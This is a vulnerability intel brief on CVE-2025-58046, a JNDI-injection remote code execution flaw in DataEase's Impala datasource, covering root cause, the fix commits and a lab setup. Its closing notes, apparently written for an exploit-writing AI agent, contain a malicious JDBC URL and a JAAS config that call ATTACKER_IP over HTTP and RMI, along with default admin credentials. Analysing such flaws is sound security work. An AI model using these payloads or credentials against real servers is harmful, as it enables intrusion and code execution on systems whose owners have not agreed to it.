# Intel Brief: CVE-2025-58046

## CVE Metadata

- **CVE ID**: CVE-2025-58046
- **Affected Software**: DataEase (open-source data visualization and analysis platform)
- **Vendor**: dataease (Fit2Cloud)
- **CVSS Score**: 9.8 (CRITICAL) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
- **EPSS**: 1.1% (77.5th percentile)
- **CWE**: CWE-502 (Deserialization of Untrusted Data), CWE-74 (Injection)
- **Published**: 2025-09-15
- **Attack Vector**: Network (unauthenticated, no user interaction required)

## Vulnerability Description

The Impala data source type in DataEase versions ≤ 2.10.12 is vulnerable to **Remote Code Execution (RCE)** via JNDI injection through the JDBC connection string. The `getJdbc()` method of the `io.dataease.datasource.type.Impala` class fails to filter dangerous Kerberos authentication parameters in user-supplied JDBC URLs.

An attacker can construct a malicious JDBC connection string containing the `krbJAASFile` parameter pointing to an attacker-controlled HTTP server hosting a JAAS configuration file. This JAAS config specifies a JNDI login module that triggers RMI deserialization, which can be weaponized with gadget chains (e.g., AspectJWeaver) to achieve arbitrary file write or command execution.

### Root Cause

The vulnerable `Impala.java` class at v2.10.12 has an incomplete blocklist (`illegalParameters`) that only blocks:
- `autoDeserialize`, `queryInterceptors`, `statementInterceptors`, `detectCustomCollations`

It does NOT block:
- `krbJAASFile` / `KrbJAASFile` (Kerberos JAAS config file — the primary attack vector)
- `krb5.conf` / `Krb5Conf`
- `jndi` / `JNDI`
- `java.naming.factory.initial` / `java.naming.provider.url`
- `connectionProperties` / `ConnectionProperties`
- `initSQL` / `InitSQL`

Furthermore, when `urlType != "hostName"` (custom JDBC URL mode), the blocklist is **never checked at all** — the URL is returned directly after only verifying it starts with `jdbc:impala`.

### Attack Chain

1. Attacker sends POST to `/datasource/validate` (or `/datasource/save`) with crafted Impala datasource config
2. Config specifies `urlType: "jdbcUrl"` and a malicious JDBC URL containing `krbJAASFile=http://ATTACKER_IP/evil_jaas.conf`
3. DataEase calls `Impala.getJdbc()` which returns the URL unfiltered
4. The JDBC driver loads the remote JAAS config file via HTTP
5. The JAAS config specifies a JNDI LoginModule pointing to an RMI server
6. The RMI server delivers a deserialization payload (e.g., AspectJWeaver gadget chain)
7. Deserialization executes arbitrary code on the DataEase server

### Vulnerable API Endpoints

- **POST `/datasource/validate`** — Validate/test datasource connection (primary exploitation path)
- **POST `/datasource/save`** — Create new datasource
- **POST `/datasource/update`** — Update existing datasource
- **POST `/datasource/getSchema`** — Get database schema

Note: The deployment may prefix these paths (e.g., `/de2api/datasource/validate` behind APISIX reverse proxy). All endpoints require basic access to the DataEase web UI.

### Call Chain

```
POST /datasource/validate
  → DatasourceServer.validate(BusiDsRequest)
    → checkDatasourceStatus(DatasourceDTO)
      → CalciteProvider.checkStatus(DatasourceRequest)
        → CalciteProvider.getConnection(DatasourceDTO)
          → JsonUtil.parseObject(configuration, Impala.class)
          → configuration.getJdbc()  ← VULNERABILITY (returns attacker-controlled URL unfiltered)
          → driverClass.connect(configuration.getJdbc(), props)
```

## Vulnerable File

**Path**: `core/core-backend/src/main/java/io/dataease/datasource/type/Impala.java`

**Vulnerable code (v2.10.12)**:
```java
public String getJdbc() {
    if(StringUtils.isNoneEmpty(getUrlType()) && !getUrlType().equalsIgnoreCase("hostName")){
        // VULNERABLE: Only checks if URL starts with jdbc:impala
        // Does NOT check illegalParameters blocklist
        if (!getJdbcUrl().startsWith("jdbc:impala")) {
            DEException.throwException("Illegal jdbcUrl: " + getJdbcUrl());
        }
        return getJdbcUrl();  // ← Returns attacker-controlled URL unfiltered
    }
    // hostname mode also lacks parameter validation on extraParams
    if(StringUtils.isEmpty(extraParams.trim())){
        return "jdbc:impala://HOSTNAME:PORT/DATABASE"...;
    } else {
        return "jdbc:impala://HOSTNAME:PORT/DATABASE;EXTRA_PARAMS"...;
        // ← EXTRA_PARAMS is unvalidated, can contain krbJAASFile
    }
}
```

## Repository Information

- **Repository URL**: https://github.com/dataease/dataease.git
- **Language**: Java (Spring Boot 3.3.0, Java 21)
- **Build System**: Maven (multi-module: root pom.xml → sdk/, core/)
- **Vulnerable Version**: v2.10.12
- **Patched Version**: v2.10.13

## Fix Details

- **Fix Commit (primary — fixes Impala.java + Db2.java)**: `77078658715bd85af5867afbfd5f1fcc37cf03c8`
  - Date: Mon Sep 1 16:21:05 2025 +0800
  - Message: "fix: 修复漏洞" (fix: fix vulnerability)
  - Files changed: `Impala.java`, `Db2.java` (both in `core/core-backend/src/main/java/io/dataease/datasource/type/`)

- **Earlier partial fix (Db2 only)**: `8d04e92d44e1bac9284e9e64df5afd7f96d9373c`
  - Date: Tue Aug 5 2025
  - Added `rmi` to Db2's blocklist only

### Fix Changes in Impala.java

1. Expanded `illegalParameters` blocklist with Kerberos (`krbJAASFile`, `KrbJAASFile`, `krb5.conf`, `Krb5Conf`), JNDI (`jndi`, `JNDI`, `java.naming.factory.initial`, `java.naming.provider.url`), and other dangerous parameters (`connectionProperties`, `initSQL`)
2. Added `URLDecoder.decode()` before checking parameters (prevents URL-encoded bypass)
3. Added parameter validation in the custom JDBC URL path (`urlType != "hostName"`) — previously the blocklist was never checked in this code path
4. Added parameter validation for the constructed URL path (hostname mode with extra params)

## Deployment / Lab Build Information

### Docker Images (Official)
- **DataEase v2.10.12**: `registry.cn-qingdao.aliyuncs.com/dataease/dataease:v2.10.12`
- **MySQL 8.4**: `registry.cn-qingdao.aliyuncs.com/dataease/mysql:8.4.5`
- **Port**: 8100 (HTTP)
- **Base image**: Alpine OpenJDK 21 JRE

### Default Configuration
- MySQL root password: `Password123@mysql`
- MySQL database: `dataease`
- MySQL host: `mysql-de`
- DataEase port: `8100`
- Default credentials: `admin` / `DataEase@123456`

### Lab Environment Requirements
- DataEase v2.10.12 container (the vulnerable target)
- MySQL 8.4 container (DataEase dependency)
- Attacker infrastructure:
  - HTTP server to host malicious JAAS config file
  - RMI/LDAP server for JNDI callback (e.g., marshalsec or similar)
  - Deserialization gadget chain payload (AspectJWeaver or similar available in classpath)
- Network connectivity between DataEase container and attacker infrastructure

### Build from Source (if needed)
- Java 21 required
- Maven build: `mvn clean package -DskipTests`
- Output JAR: `core/core-backend/target/CoreApplication.jar`
- Module structure: `pom.xml` (root) → `sdk/` (API), `core/` (backend + frontend)

### Key Dependencies
- Spring Boot 3.3.0
- MyBatis Plus 3.5.6
- H2 Database 2.2.220 (embedded, standalone mode)
- Apache Calcite 1.35.19
- MySQL Connector/J 8.2.0
- Lombok
- Apache Commons Lang3
- Cloudera Impala JDBC Driver (`com.cloudera.impala.jdbc.Driver`) — loaded at runtime from `/opt/dataease2.0/drivers/`

## Public Exploits

### EIP Exploit #77050 (Classification: WRITEUP)
- **Type**: Writeup / patch analysis (not a standalone PoC script)
- **Source**: Fix commit diff from GitHub
- **Quality**: Reliable analysis, moderate complexity, 95% confidence
- **Safety**: Clean — no trojan indicators, this is just the patch diff
- **Attack type**: Deserialization
- **Requires auth**: No
- **Useful for**: Understanding the vulnerability; no ready-to-use exploit script exists

### No Nuclei Templates Available
### No Metasploit Modules Available

### No Ready-to-Use PoC Scripts Found
A PoC must be written from scratch. The attack requires:
1. Python/Java script to send crafted datasource configuration to the DataEase API
2. Malicious JAAS configuration file hosted on HTTP server
3. RMI/LDAP server with deserialization payload (marshalsec + ysoserial/similar)

## References

1. **GitHub Advisory**: https://github.com/dataease/dataease/security/advisories/GHSA-mvwc-x8x9-46c3
2. **Fix Commit (primary)**: https://github.com/dataease/dataease/commit/77078658715bd85af5867afbfd5f1fcc37cf03c8
3. **Fix Commit (Db2, secondary)**: https://github.com/dataease/dataease/commit/8d04e92d44e1bac9284e9e64df5afd7f96d9373c
4. **DataEase GitHub**: https://github.com/dataease/dataease
5. **v2.10.12 Release**: https://github.com/dataease/dataease/releases/tag/v2.10.12
6. **v2.10.13 Release**: https://github.com/dataease/dataease/releases/tag/v2.10.13

## Exploit Development Notes for PoC Agent

### Malicious JDBC URL Example
```
jdbc:impala://127.0.0.1:21050/default;AuthMech=1;KrbRealm=EXAMPLE.COM;KrbHostFQDN=impala.example.com;KrbServiceName=impala;krbJAASFile=http://ATTACKER_IP:ATTACKER_HTTP_PORT/evil_jaas.conf
```

### Malicious JAAS Config (evil_jaas.conf)
```
Client {
  com.sun.security.auth.module.JndiLoginModule required
  user.provider.url="rmi://ATTACKER_IP:1099/evil"
  group.provider.url="rmi://ATTACKER_IP:1099/evil";
};
```

### API Request Format
The datasource config is sent as JSON in the request body to `POST /datasource/validate`. The `configuration` field contains a **Base64-encoded** JSON string. Key fields:
- `type`: `"impala"`
- `configuration`: Base64-encoded JSON with `urlType: "jdbcUrl"` and `jdbcUrl` containing the malicious URL

Example configuration JSON (before Base64 encoding):
```json
{
  "urlType": "jdbcUrl",
  "jdbcUrl": "jdbc:impala://127.0.0.1:21050/default;AuthMech=1;KrbRealm=EXAMPLE.COM;KrbHostFQDN=impala.example.com;KrbServiceName=impala;krbJAASFile=http://ATTACKER_IP/evil_jaas.conf"
}
```

### Gadget Chain Considerations
DataEase runs on Java 21 with Spring Boot 3.3.0. Check the classpath for available gadget chains:
- **AspectJWeaver** (mentioned in fix commit message "Aspectjweaver反序列化任意文件写入漏洞" — likely in classpath, enables arbitrary file write)
- Commons Collections
- Spring framework gadgets
- H2 database gadgets

### Authentication Notes
While the CVSS vector says PR:N (no privileges required), the DataEase web UI requires login. However, the default credentials `admin`/`DataEase@123456` are well-known, making this effectively unauthenticated for default installations.
